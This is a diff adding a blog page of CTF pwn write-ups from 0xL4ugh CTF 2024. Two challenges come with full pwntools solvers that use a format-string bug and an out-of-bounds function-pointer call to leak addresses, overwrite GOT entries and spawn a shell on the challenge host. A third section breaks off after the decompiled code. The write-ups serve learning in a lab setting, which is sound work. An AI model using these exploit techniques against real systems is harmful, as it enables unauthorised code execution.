@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="shortcut icon" href="assets/images/luffy.jpg" sizes="any">
+    <link rel="icon" href="assets/images/luffy.jpg" type="image/svg+xml">
+    <link rel="stylesheet" href="/assets/styles/global.css">
+    <title>0xLaugh CTF | PWN writeups | Buddurid's blog</title>
+
+    <!-- SEO Metadata -->
+    <meta property="og:title" content="0xLaugh CTF | PWN writeups | Buddurid's blog" />
+    <meta property="og:site_name" content="Buddurid's blog" />
+    <meta property="description" content="some quick explanations + solvers" />
+    <meta property="og:description" content="some quick explanations + solvers" />
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="https://buddurid.github.io/assets/images/luffy.jpg">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="theme-color" content="#FFBD3F" />
+    <link rel="canonical" href="https://buddurid.github.io/2024/12/27/0xl4ugh-CTF-2024" />
+
+    <!-- KaTeX -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css" integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
+
+</head>
+<body><div class="load" id="load">
+    <pre class="term" id="term">buddurid@CTF:~$ </pre>
+    <script src="/assets/splashscreen.js"></script>
+</div><nav class="open">
+    <div class="hex" role="img" aria-label="Navigation bar background graphic, styled like the address panel of a hex editor.">
+        <ol><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/></ol>
+    </div>
+    <ul>
+        <li id="splash-hack-zero-for-reference" aria-hidden="true">0</li><li >
+                <a href="/"
+                   title="Me">Me</a>
+            </li><li style="z-index: 1;">
+                <a href="/blog"
+                   title="Blog"highlighted>Blog</a>
+            </li><li >
+                <a href="/ctfs"
+                   title="CTFs">CTFs</a>
+            </li></ul>
+
+</nav>
+
+<div class="nav-toggle hamburger-container">
+    <div class="hamburger-button"></div>
+</div>
+
+
+<script>
+    const responsiveNavThreshold = 500;
+    const navOpener = document.querySelector('.nav-toggle');
+    const nav = document.querySelector('nav');
+
+    const toggle = (cl, attr) => cl.contains(attr) ? cl.remove(attr) : cl.add(attr);
+
+    navOpener.addEventListener('click', () => {
+        toggle(nav.classList, 'open');
+    });
+
+    let enabled = false;
+
+    const setResponsive = () => {
+        if (window.innerWidth < responsiveNavThreshold) {
+            if (enabled) return;
+            enabled = true;
+            nav.classList.remove('open');
+            navOpener.classList.add('enabled');
+        }
+        else {
+            if (!enabled) return;
+            enabled = false;
+            nav.classList.add('open');
+            navOpener.classList.remove('enabled');
+        }
+    };
+    setResponsive();
+    window.addEventListener('resize', setResponsive);
+</script>
+<div class="content">
+            <main>
+                <article>
+    <h1 class="post-title">0xLaugh CTF | PWN writeups</h1>
+    <p class="post-author-date"><b></b><em> - December 27, 2024</em></p>
+
+
+    <div class="tags">
+
+        <strong>Categories: </strong>
+
+        
+        <span>PWN</span>
+        
+        <span>format-string</span>
+        
+        <span>TLS</span>
+        
+
+    </div>
+
+    <p><i>some quick explanations + solvers</i></p>
+
+    <hr>
+
+    <h1 id="yet-another-format-string-bug">Yet Another Format String Bug</h1>
+
+<p>lets start by the disassembly</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">270</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-110h] BYREF</span>
+  <span class="kr">__int16</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+10Eh] [rbp-2h]</span>
+
+  <span class="n">v5</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">setup</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
+  <span class="k">do</span>
+  <span class="p">{</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0xFFuLL</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">while</span> <span class="p">(</span> <span class="n">v5</span> <span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>we have a one time format string vulnerability with fairly long input . Although it is possible to do a oneshot format string with the onegadgets but it’s a pain in the ass so we gonna look for restart .</p>
+
+<h4 id="how-to-restart-">How to restart :</h4>
+
+<ol>
+  <li>we look to restart by overwriting some <code class="language-plaintext highlighter-rouge">GOT entry</code> since the binary is <code class="language-plaintext highlighter-rouge">PARTIAL-relro</code> and <code class="language-plaintext highlighter-rouge">NO pie</code> . but this isnt feasable since there is no function we can call after printf . so we cant do it this way</li>
+  <li>we can look to restart by overwriting the loop check variable (v5 in my case) . we can do it by partially modifying a stack pointer to make it point to <code class="language-plaintext highlighter-rouge">rbp-0x2</code> then just <code class="language-plaintext highlighter-rouge">%hhn into it</code></li>
+</ol>
+
+<p>i found a good pointer at <code class="language-plaintext highlighter-rouge">input+8</code> , that in most cases (sometimes gets it wrong in remote), requires only 1 nibble brute force , in other words <code class="language-plaintext highlighter-rouge">1/16 win chance</code> .</p>
+
+<p>from there it’s standart libc leak into system(/bin/sh) , i chose to overwrite <code class="language-plaintext highlighter-rouge">printf GOT entry</code> with system , so when we call printf(“/bin/sh) , what actually gets called is <code class="language-plaintext highlighter-rouge">system("/bin/sh)</code></p>
+
+<h4 id="solver">Solver</h4>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+
+<span class="k">def</span> <span class="nf">debug</span><span class="p">():</span>
+        <span class="k">if</span> <span class="n">local</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">:</span>
+                <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s">'''
+                        b* main+67
+                        c
+                        '''</span><span class="p">)</span>
+<span class="c1">###############   files setup   ###############
+</span><span class="n">local</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span>
+<span class="n">exe</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./yet_another_fsb"</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
+<span class="n">nc</span><span class="o">=</span><span class="s">"nc a7b542bc3fb6a4133c2d0774aa9033ca.chal.ctf.ae 443"</span>
+<span class="n">port</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">nc</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">2</span><span class="p">])</span>
+<span class="n">host</span><span class="o">=</span><span class="n">nc</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="c1">############### remote or local ###############
+</span><span class="k">if</span> <span class="n">local</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="mi">443</span><span class="p">,</span> <span class="n">ssl</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">sni</span><span class="o">=</span><span class="n">host</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">])</span>
+
+<span class="c1">############### helper functions ##############
+</span><span class="k">def</span> <span class="nf">send</span><span class="p">():</span>
+        <span class="k">pass</span>
+
+<span class="c1">############### main exploit    ###############
+</span>
+<span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
+        <span class="k">global</span> <span class="n">p</span>
+        <span class="c1">#p=process([exe.path])
+</span>        <span class="n">p</span><span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="mi">443</span><span class="p">,</span> <span class="n">ssl</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">sni</span><span class="o">=</span><span class="n">host</span><span class="p">)</span>
+        <span class="n">payload</span><span class="o">=</span><span class="s">"a%7$hhn"</span><span class="p">.</span><span class="n">encode</span><span class="p">().</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s">"a"</span><span class="p">)</span>
+        <span class="n">brute</span><span class="o">=</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x30</span><span class="o">-</span><span class="mi">2</span><span class="p">)</span>
+        <span class="n">payload</span><span class="o">+=</span><span class="n">brute</span>
+        <span class="c1">#debug()
+</span>        <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+        <span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+        <span class="n">index</span><span class="o">=</span><span class="p">(</span><span class="mh">0x118</span><span class="o">//</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="mi">6</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s">"bbbbbb%</span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s">$p"</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"bbbbbb"</span><span class="p">)</span>
+        <span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+        <span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="mh">0x25c88</span>
+        <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>
+        <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'hello'</span><span class="p">)</span>
+
+        <span class="n">payload</span><span class="o">=</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">6</span><span class="p">,{</span><span class="mh">0x404000</span><span class="p">:</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">]},</span><span class="n">write_size</span><span class="o">=</span><span class="s">'byte'</span><span class="p">)</span>
+
+        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+        <span class="c1">#p.recvuntil(payload[:4])
+</span>        <span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+
+        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"/bin/sh;"</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+
+
+<span class="n">i</span><span class="o">=</span><span class="mi">1</span>
+<span class="k">while</span> <span class="n">i</span><span class="p">:</span>
+        <span class="n">i</span><span class="o">=</span><span class="mi">1</span>
+        <span class="k">try</span> <span class="p">:</span>
+                <span class="n">exploit</span><span class="p">()</span>
+        <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
+                <span class="k">print</span><span class="p">(</span><span class="s">"bye"</span><span class="p">)</span>
+                <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="k">except</span><span class="p">:</span>
+                <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+
+
+</code></pre></div></div>
+
+<hr />
+
+<h1 id="wanna-play-a-game">Wanna Play a Game?</h1>
+
+<p>lets disassemble the binary with ida</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-10h]</span>
+  <span class="n">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]</span>
+
+  <span class="n">setup</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"[*] NickName&gt; "</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">username</span><span class="p">,</span> <span class="mh">0x40uLL</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">perror</span><span class="p">(</span><span class="s">"READ ERROR"</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">menu</span><span class="p">();</span>
+    <span class="n">v3</span> <span class="o">=</span> <span class="n">read_int</span><span class="p">();</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] Guess&gt;"</span><span class="p">);</span>
+    <span class="n">v4</span> <span class="o">=</span> <span class="n">read_int</span><span class="p">();</span>
+    <span class="p">((</span><span class="kt">void</span> <span class="p">(</span><span class="kr">__fastcall</span> <span class="o">*</span><span class="p">)(</span><span class="n">__int64</span><span class="p">))</span><span class="n">conv</span><span class="p">[</span><span class="n">v3</span> <span class="o">-</span> <span class="mi">1</span><span class="p">])(</span><span class="n">v4</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>we have out of bounds function pointer call , and <code class="language-plaintext highlighter-rouge">rdi</code> of our choosing</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="n">__int64</span> <span class="kr">__fastcall</span> <span class="nf">hard</span><span class="p">(</span><span class="n">__int64</span> <span class="n">a1</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+14h] [rbp-2Ch]</span>
+  <span class="kt">char</span> <span class="n">path</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="c1">// [rsp+2Fh] [rbp-11h] BYREF</span>
+  <span class="kt">char</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+37h] [rbp-9h]</span>
+  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+38h] [rbp-8h]</span>
+
+  <span class="n">v5</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+  <span class="n">strcpy</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">"&lt;qz}&lt;`{"</span><span class="p">);</span>
+  <span class="n">v4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">6</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+    <span class="n">path</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="mh">0x13u</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">a1</span> <span class="o">==</span> <span class="n">passcode</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"[+] WINNNN!"</span><span class="p">);</span>
+    <span class="n">execve</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"[-] YOU ARE NOT WORTHY FOR A SHELL!"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">change_passcode</span><span class="p">();</span>
+  <span class="k">return</span> <span class="n">v5</span> <span class="o">-</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>if we provide the right <code class="language-plaintext highlighter-rouge">passcode</code> we get a shell</p>
+
+<h4 id="plan-">Plan :</h4>
+
+<ol>
+  <li>we can jump directly to the <code class="language-plaintext highlighter-rouge">execve</code> line , but rsi and rdi need to be nulled out and it wasnt the case</li>
+  <li>we leak the passcode with <code class="language-plaintext highlighter-rouge">printf(&amp;passcode)</code> then call <code class="language-plaintext highlighter-rouge">hard(passcode)</code> to WIN</li>
+</ol>
+
+<p>for that , we need to write the <code class="language-plaintext highlighter-rouge">printf GOT entry</code> in <code class="language-plaintext highlighter-rouge">Username</code> to then call it with <code class="language-plaintext highlighter-rouge">&amp;passcode </code> » PASSCODE leaked and gg</p>
+
+<h4 id="solver-">solver :</h4>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+
+<span class="k">def</span> <span class="nf">debug</span><span class="p">():</span>
+        <span class="k">if</span> <span class="n">local</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">:</span>
+                <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s">'''
+                        b* 0x000000000040162f
+                        c
+                        '''</span><span class="p">)</span>
+<span class="c1">###############   files setup   ###############
+</span><span class="n">local</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span>
+<span class="n">exe</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./chall"</span><span class="p">)</span>
+<span class="c1">#libc=ELF("./libc.so.6")
+</span><span class="n">nc</span><span class="o">=</span><span class="s">"nc 3d5055083024005fa38ef5ab28953c07.chal.ctf.ae 443"</span>
+<span class="n">port</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">nc</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">2</span><span class="p">])</span>
+<span class="n">host</span><span class="o">=</span><span class="n">nc</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="c1">############### remote or local ###############
+</span><span class="k">if</span> <span class="n">local</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="mi">443</span><span class="p">,</span> <span class="n">ssl</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">sni</span><span class="o">=</span><span class="n">host</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">])</span>
+
+<span class="c1">############### helper functions ##############
+</span><span class="k">def</span> <span class="nf">send</span><span class="p">():</span>
+        <span class="k">pass</span>
+
+<span class="c1">############### main exploit    ###############
+</span><span class="n">got</span><span class="o">=</span><span class="mh">0x403f70</span>
+<span class="n">conv</span><span class="o">=</span><span class="mh">0x404010</span>
+<span class="n">username</span><span class="o">=</span><span class="mh">0x404080</span>
+<span class="n">passcode</span><span class="o">=</span><span class="mh">0x404060</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">passcode</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+<span class="c1">#debug()
+</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">((</span><span class="n">got</span> <span class="o">-</span> <span class="n">conv</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span><span class="o">//</span><span class="mi">8</span><span class="p">))</span>
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"[*] Guess&gt;"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">passcode</span><span class="p">))</span>
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+<span class="n">leak</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"[*] Guess&gt;"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<hr />
+
+<h1 id="recover-your-vision">Recover Your Vision</h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Checksec:
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX unknown - GNU_STACK missing
+    PIE:        No PIE <span class="o">(</span>0x3fe000<span class="o">)</span>
+    Stack:      Executable
+    RWX:        Has RWX segments
+    RUNPATH:    b<span class="s1">'.'</span>
+    Stripped:   No
+</code></pre></div></div>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">pthread_t</span> <span class="n">newthread</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-10h] BYREF</span>
+
+  <span class="n">newthread</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+  <span class="n">setup</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"[*] Can you escape my jail?"</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">pthread_create</span><span class="p">(</span><span class="n">newthread</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="n">vuln</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">)</span> <span class="p">)</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+  <span class="n">pthread_join</span><span class="p">(</span><span class="n">newthread</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">0LL</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>we have our main thread calling a new thread to execute vuln</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">a1</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">size_t</span> <span class="n">nbytes</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-88h] BYREF</span>
+  <span class="n">_BYTE</span> <span class="n">buf</span><span class="p">[</span><span class="mi">120</span><span class="p">];</span> <span class="c1">// [rsp+20h] [rbp-80h] BYREF</span>
+  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+98h] [rbp-8h]</span>
+
+  <span class="n">v4</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+  <span class="n">nbytes</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"[*] Buffer: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"[*] What is the length of your shellcode: "</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">nbytes</span><span class="p">);</span>
+  <span class="n">getchar</span><span class="p">();</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"[*] Escape&gt; "</span><span class="p">);</span>
+  <span class="n">disable</span><span class="p">();</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">nbytes</span><span class="p">);</span>
+  <span class="n">close</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+  <span class="k">return</span> <span class="n">close</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="n">we</span> <span class="n">also</span> <span class="n">have</span> <span class="n">the</span> <span class="n">disable</span> <span class="n">function</span> <span class="n">which</span> <span class="n">implements</span> <span class="n">a</span> <span class="n">whitelist</span> <span class="n">seccomp</span> <span class="o">:</span>
+<span class="err">```</span><span class="n">bash</span>
+<span class="n">seccomp</span><span class="o">-</span><span class="n">tools</span> <span class="n">dump</span> <span class="p">.</span><span class="o">/</span><span class="n">blind</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Can</span> <span class="n">you</span> <span class="n">escape</span> <span class="n">my</span> <span class="n">jail</span><span class="o">?</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Buffer</span><span class="o">:</span> <span class="mh">0x7f5529d26e50</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">What</span> <span class="n">is</span> <span class="n">the</span> <span class="n">length</span> <span class="n">of</span> <span class="n">your</span> <span class="n">shellcode</span><span class="o">:</span> <span class="n">azeazeaz</span>
